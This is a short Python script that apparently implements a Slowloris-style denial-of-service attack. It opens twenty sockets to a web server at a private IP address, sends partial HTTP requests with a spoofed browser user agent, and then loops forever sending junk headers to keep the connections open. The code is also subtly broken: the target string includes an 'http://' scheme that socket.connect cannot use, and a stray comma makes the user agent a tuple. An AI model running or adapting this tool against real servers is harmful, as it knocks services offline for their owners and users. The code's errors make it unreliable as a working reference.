

import random
import socket




user_agegent_data="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",



target="http://192.168.137.75/"
port=80

number_of_contion_to_make=20

def make_socket():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((target, port))
    return (s)

lsit_if_connection=[]



for q in range(number_of_contion_to_make):
    lsit_if_connection.append(make_socket())

#a stated get request  to make us look like a real user
for s in lsit_if_connection:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

    s.send("User-Agent: {}\r\n".format(user_agegent_data).encode("utf-8"))

    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))


#send a const stream of data
while 1:
    for s in lsit_if_connection:
        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
